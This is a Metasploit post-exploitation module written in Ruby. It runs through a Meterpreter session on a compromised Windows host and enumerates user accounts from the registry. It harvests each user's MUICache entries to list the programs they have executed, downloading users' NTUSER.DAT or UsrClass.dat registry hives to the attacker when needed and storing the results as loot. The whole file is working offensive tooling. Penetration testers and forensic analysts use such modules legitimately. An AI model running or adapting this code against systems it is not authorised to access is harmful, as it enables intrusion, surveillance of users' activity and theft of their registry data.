##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/registry'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
      'Name'        =>'Windows Gather Enum User MUICache',
      'Description' =>
      %q{
        This module gathers information about the files and file paths that logged on users have
        executed on the system. It also will check if the file still exists on the system. This
        information is gathered by using information stored under the MUICache registry key. If
        the user is logged in when the module is executed it will collect the MUICache entries
        by accessing the registry directly. If the user is not logged in the module will download
        users registry hive NTUSER.DAT/UsrClass.dat from the system and the MUICache contents are
        parsed from the downloaded hive.
      },
      'License'     =>  MSF_LICENSE,
      'Author'      =>  ['TJ Glad <tjglad[at]cmail.nu>'],
      'Platform'    =>  ['win'],
      'SessionType' =>  ['meterpreter']
    ))
  end

  # Scrapes usernames, sids and homepaths from the registry so that we'll know
  # what user accounts are on the system and where we can find those users
  # registry hives.
  def find_user_names
    user_names = []
    user_homedir_paths = []
    user_sids = []

    username_reg_path = "HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList"
    profile_subkeys = registry_enumkeys(username_reg_path)
    if profile_subkeys.blank?
      print_error("Unable to access ProfileList registry key. Unable to continue.")
      return nil
    end

    profile_subkeys.each do |user_sid|
      unless user_sid.length > 10
        next
      end
      user_home_path = registry_getvaldata("#{username_reg_path}\\#{user_sid}", "ProfileImagePath")
      if user_home_path.blank?
        print_error("Unable to read ProfileImagePath from the registry. Unable to continue.")
        return nil
      end
      full_path = user_home_path.strip
      user_names << full_path.split("\\").last
      user_homedir_paths << full_path
      user_sids << user_sid
    end

    return user_names, user_homedir_paths, user_sids
  end

  # This function builds full registry muicache paths so that we can
  # later enumerate the muicahe registry key contents.
  def enum_muicache_paths(sys_sids, mui_path)
    user_mui_paths = []
    hive = "HKU\\"

    sys_sids.each do |sid|
      full_path = hive + sid + mui_path
      user_mui_paths << full_path
    end

    user_mui_paths
  end

  # This is the main enumeration function that calls other main
  # functions depending if we can access the registry directly or if
  # we need to download the hive and process it locally.
  def enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file)
    results = []

    all_user_entries = sys_users.zip(muicache_reg_keys, sys_paths)

    all_user_entries.each do |user, reg_key, sys_path|

      subkeys = registry_enumvals(reg_key)
      if subkeys.blank?
        # If the registry_enumvals returns us nothing then we'll know
        # that the user is most likely not logged in and we'll need to
        # download and process users hive locally.
        print_warning("User #{user}: Can't access registry. Maybe the user is not logged in? Trying NTUSER.DAT/USRCLASS.DAT...")
        result = process_hive(sys_path, user, muicache, hive_file)
        unless result.nil?
          result.each { |r|
            results << r unless r.nil?
          }
        end
      else
        # If the registry_enumvals returns us content we'll know that we
        # can access the registry directly and thus continue to process
        # the content collected from there.
        print_status("User #{user}: Enumerating registry...")
        subkeys.each do |key|
          if key[0] != "@" && key != "LangID" && !key.nil?
            result = check_file_exists(key, user)
            results << result unless result.nil?
          end
        end
      end
    end

    results
  end

  # This function will check if it can find the program executable
  # from the path it found from the registry. Permissions might affect
  # if it detects the executable but it should be otherwise fairly
  # reliable.
  def check_file_exists(key, user)
    program_path = expand_path(key)
    if file_exist?(key)
      return [user, program_path, "File found"]
    else
      return [user, program_path, "File not found"]
    end
  end

  # This function will check if the filepath contains a registry hive
  # and if it does it'll proceed to call the function responsible of
  # downloading the hive. After successfull download it'll continue to
  # call the hive_parser function which will extract the contents of
  # the MUICache registry key.
  def process_hive(sys_path, user, muicache, hive_file)
    user_home_path = expand_path(sys_path)
    hive_path = user_home_path + hive_file
    ntuser_status = file_exist?(hive_path)

    unless ntuser_status == true
      print_warning("Couldn't locate/download #{user}'s registry hive. Unable to proceed.")
      return nil
    end

    print_status("Downloading #{user}'s NTUSER.DAT/USRCLASS.DAT file...")
    local_hive_copy = Rex::Quickfile.new("jtrtmp")
    local_hive_copy.close
    begin
      session.fs.file.download_file(local_hive_copy.path, hive_path)
    rescue ::Rex::Post::Meterpreter::RequestError
      print_error("Unable to download NTUSER.DAT/USRCLASS.DAT file")
      local_hive_copy.unlink rescue nil
      return nil
    end
    results = hive_parser(local_hive_copy.path, muicache, user)
    local_hive_copy.unlink rescue nil # Windows often complains about unlinking tempfiles

    results
  end

  # This function is responsible for parsing the downloaded hive and
  # extracting the contents of the MUICache registry key.
  def hive_parser(local_hive_copy, muicache, user)
    results = []
    print_status("Parsing registry content...")
    err_msg = "Error parsing hive. Unable to continue."
    hive = Rex::Registry::Hive.new(local_hive_copy)
    if hive.nil?
      print_error(err_msg)
      return nil
    end

    muicache_key = hive.relative_query(muicache)
    if muicache_key.nil?
      print_error(err_msg)
      return nil
    end

    muicache_key_value_list = muicache_key.value_list
    if muicache_key_value_list.nil?
      print_error(err_msg)
      return nil
    end

    muicache_key_values = muicache_key_value_list.values
    if muicache_key_values.nil?
      print_error(err_msg)
      return nil
    end

    muicache_key_values.each do |value|
      key = value.name
      if key[0] != "@" && key != "LangID" && !key.nil?
        result = check_file_exists(key, user)
        results << result unless result.nil?
      end
    end

    results
  end

  # Information about the MUICache registry key was collected from:
  #
  # - Windows Forensic Analysis Toolkit / 2012 / Harlan Carvey
  # - Windows Registry Forensics / 2011 / Harlan Carvey
  # - http://forensicartifacts.com/2010/08/registry-muicache/
  # - http://www.irongeek.com/i.php?page=security/windows-forensics-registry-and-file-system-spots
  def run
    print_status("Starting to enumerate MUICache registry keys...")
    sys_info = sysinfo['OS']

    if sys_info =~/Windows XP/ && is_admin?
      print_good("Remote system supported: #{sys_info}")
      muicache = "\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"
      hive_file = "\\NTUSER.DAT"
    elsif sys_info =~/Windows 7/ && is_admin?
      print_good("Remote system supported: #{sys_info}")
      muicache = "_Classes\\Local\ Settings\\Software\\Microsoft\\Windows\\Shell\\MUICache"
      hive_file = "\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat"
    else
      print_error("Unsupported OS or not enough privileges. Unable to continue.")
      return nil
    end

    table = Rex::Text::Table.new(
      'Header'  =>  'MUICache Information',
      'Indent'  =>  1,
      'Columns' =>
      [
        "Username",
        "File path",
        "File status",
      ])

    print_status("Phase 1: Searching user names...")
    sys_users, sys_paths, sys_sids = find_user_names

    if sys_users.blank?
      print_error("Was not able to find any user accounts. Unable to continue.")
      return nil
    else
      print_good("Users found: #{sys_users.join(", ")}")
    end

    print_status("Phase 2: Searching registry hives...")
    muicache_reg_keys = enum_muicache_paths(sys_sids, muicache)
    results = enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file)

    results.each { |r| table << r }

    print_status("Phase 3: Processing results...")
    loot = store_loot("muicache_info", "text/plain", session, table.to_s, nil, "MUICache Information")
    print_line("\n" + table.to_s + "\n")
    print_good("Results stored as: #{loot}")
    print_status("Execution finished.")
  end
end
